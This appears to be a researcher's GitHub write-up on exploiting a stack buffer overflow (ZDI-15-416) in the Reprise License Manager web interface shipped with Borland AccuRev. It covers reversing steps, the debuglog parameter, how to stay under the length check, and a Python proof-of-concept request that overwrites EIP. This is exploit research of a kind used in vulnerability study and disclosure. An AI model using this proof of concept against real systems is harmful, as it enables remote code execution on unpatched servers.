# Borland-AccuRev-StackoverFlow
****
mail :   Firozimaysam@gmail.com 
twitter : https://twitter.com/R00tkitSMM 

I try to Exploit recently published  vulnerability in Borland AccuRev 

http://www.zerodayinitiative.com/advisories/ZDI-15-416/

````
his vulnerability allows remote attackers to execute arbitrary code on 
vulnerable installations of Borland AccuRev. Authentication is not required
to exploit this vulnerability.

The specific flaw exists within the service_startup_doit functionality
of the Reprise License Manager service. The issue lies in the handling 
of the licfile parameter which can result in overflowing a stack-based buffer.
An attacker could leverage this vulnerability to execute code under the context of SYSTEM.
````
there was two fake information in ZDI report

1. mapping between string and function is "service_Setup_doit" not "service_startup_doit"
2. vulnerable parameter is debuglog not licfile 

RLM come with AccuRev but it can be directly download  by following link:  http://www.reprisesoftware.com/license_admin_kits/rlm.v11.3BL1-x86_w1.admin.exe

searching service_startup_doit string inside rlm.exe dont have any results so i changed it to service_  to get following strings

![alt tag](https://raw.githubusercontent.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/master/stringInIdapro.png)

after some reversing and  analyzing functions that use above string i decide to use another way to finding bug 

ZDI said vunlnerable function is accessible remotely so I start read RLM manal to find out how it work 
RLM have Web interface it start http server on port 5054 , with the help of burpsuite we can view all http parameters in post or get requests 
after fuzzing Web interface i found target "licfile" parameter in one  Post request
![alt tag](https://raw.githubusercontent.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/master/burpsuite.png)

for checking licfile parameter vunlarblity with help of BurpSuite i send big string parameter to web server
![alt tag](https://raw.githubusercontent.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/master/bigbuffer.png)
but rlm.exe send error  response  without any crash 
![alt tag](https://raw.githubusercontent.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/master/httperror.png)
i set breakpoint in Immunity debugger to track how rlm.exe validate size of string 
![alt tag](https://raw.githubusercontent.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/master/asm-check.png)

based  on above asm code rlm check string size be less than or egaul to 0x400 to prvent buffer overflow so i thought my rlm.exe version is not vulnerabile but i start fuzzing other attack vetors ,so i findout if you send big  string in debuglog parameter and  if string is less than  0x400 to bypass above check you can overiride return value in stack  with  notorious 0x41414141 in rlm.exe so i as said  vulnerabile function is debuglog not licfile .

![alt tag](https://raw.githubusercontent.com/Rootkitsmm/Borland-AccuRev-StackoverFlow/master/eip.png)

i checked rlm.exe and  it does not support ASLR but there was a big problem,rlm.exe contain null in its addressو so we can't use any address to build our ROP inside rlm.exeو becuse it use string copy functios and it copy string in stack unitl null byte.
so exploting this vulnerability is so simple in XP,just return to shellcode insde stack without ROP 

````
import requests
url="http://10.211.55.39:5054/goform/service_setup_doit"
data= {
    'servicedesc':'RLM+License+Server',
    'servicename':'rlm',
    'action':'1',
    'debuglog':'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
    BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
    CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'+"\x41\x41\x41\x41",
    'licfile':'C:\Users\username\Desktop\rlm-old'
    }
print requests.post(url, data=data).text
``````

